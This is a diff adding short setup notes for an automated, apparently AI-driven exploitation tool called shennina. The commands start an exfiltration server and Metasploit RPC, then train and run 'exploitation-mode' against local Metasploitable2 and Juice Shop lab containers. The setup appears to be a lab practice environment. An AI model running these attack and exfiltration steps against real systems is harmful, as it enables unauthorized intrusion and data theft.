@@ -1,0 +1,35 @@
+# --------------- Before running shennina -------------
+# -------runs exfiltration server (separeted console)
+```bash
+$ cd ./exfiltration-server/
+$ sudo ./run-server.sh
+# ------runs msfconsole (separeted console)
+./scripts/run-msfrpc.py
+
+
+#---------- ini exploits tree ------------- (already done)
+./shennina.py --initialize-exploits-tree
+
+
+# ------ ini docker exploitable services (LOCAL) ----------
+# sudo docker pull tleemcjr/metasploitable2
+docker run -ti --hostname metasploitable2 tleemcjr/metasploitable2
+
+#------ scanning phase------#
+sudo ./shennina.py --lhost metasploit-ip --target target.local --service-scan-only
+
+# ------------- training shennina ------------------#
+sudo ./shennina.py --target 172.17.0.2 --lhost 172.17.0.1 --training-mode
+
+
+# --------------- attacking with recommended exploit given by shennina AI -------------------#
+sudo ./shennina.py --target 172.17.0.2 --lhost 172.17.0.1 --exploitation-mode
+
+#---------------to run docker container of OWASP juiceShop---------------#
+docker run -d -p 3000:3000 bkimminich/juice-shop
+sudo docker ps  -----*to have the ID*------
+sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container_id   -----*to have the IP*-----
+
+#--------------to run the connection with cloudFlareZeroTrust--------------#
+warp-cli connect
+warp-cli disconnect
